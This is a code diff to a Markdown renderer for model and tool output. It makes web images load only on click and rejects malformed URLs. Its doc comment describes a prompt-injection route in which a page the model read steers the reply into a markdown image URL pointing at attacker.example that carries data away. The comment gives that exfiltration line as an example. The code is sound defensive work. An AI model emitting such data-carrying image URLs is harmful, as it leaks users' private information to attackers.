@@ -35,12 +35,40 @@ function PreBlock({ children }: { children?: ReactNode }): JSX.Element {
   );
 }
 
+/**
+ * An image from the web, loaded only when asked for. A reply can be steered by
+ * a page the model read, and an image is fetched the moment it renders, so
+ * `![](https://attacker.example/p.png?d=…)` would carry off whatever the model
+ * had seen without a click. The full URL is in the tooltip.
+ */
+function RemoteImage({ src, alt }: { src: string; alt?: string }): JSX.Element | null {
+  const [shown, setShown] = useState(false);
+  const host = hostOf(src);
+  if (!host) return null;
+  if (shown) return <img src={src} alt={alt ?? "image"} loading="lazy" referrerPolicy="no-referrer" />;
+  return (
+    <button type="button" className="remote-image" title={src} onClick={() => setShown(true)}>
+      Load image{alt ? ` “${alt}”` : ""} from {host}
+    </button>
+  );
+}
+
+/** The host of an absolute URL, or "" when it doesn't parse. */
+function hostOf(url: string): string {
+  try {
+    return new URL(url).host;
+  } catch {
+    return "";
+  }
+}
+
 /** Allow only safe URLs in model/tool output: http(s) + anchor + image data. */
 function safeUrl(url: string | undefined): string {
   if (!url) return "";
   const trimmed = url.trim();
   if (trimmed.startsWith("#")) return trimmed;
-  if (/^https?:\/\//i.test(trimmed)) return trimmed;
+  // A malformed URL like `https://` must not reach anything that parses it.
+  if (/^https?:\/\//i.test(trimmed)) return hostOf(trimmed) ? trimmed : "";
   if (/^data:image\/(png|jpeg|gif|webp);base64,/i.test(trimmed)) return trimmed;
   if (/^(mailto|tel):/i.test(trimmed)) return trimmed;
   return "";
@@ -66,6 +94,7 @@ export default function Markdown({ children }: { children: string }): JSX.Elemen
         img: ({ node, src, alt, ...props }) => {
           const safe = safeUrl(typeof src === "string" ? src : undefined);
           if (!safe) return null;
+          if (/^https?:\/\//i.test(safe)) return <RemoteImage src={safe} alt={alt} />;
           // eslint-disable-next-line @typescript-eslint/no-unused-vars
           return <img {...props} src={safe} alt={alt ?? "image"} loading="lazy" referrerPolicy="no-referrer" />;
         },
